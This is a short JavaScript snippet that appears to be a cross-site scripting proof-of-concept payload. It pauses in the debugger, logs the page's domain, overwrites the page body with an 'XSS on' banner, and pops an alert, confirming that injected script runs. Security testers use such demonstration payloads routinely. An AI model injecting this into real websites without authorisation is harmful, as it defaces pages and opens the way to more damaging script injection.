debugger;
console.log("XSS on " + document.domain);
document.body.innerHTML=`<b><h1>XSS on ${document.domain}</h1></b>`;
alert(document.domain)
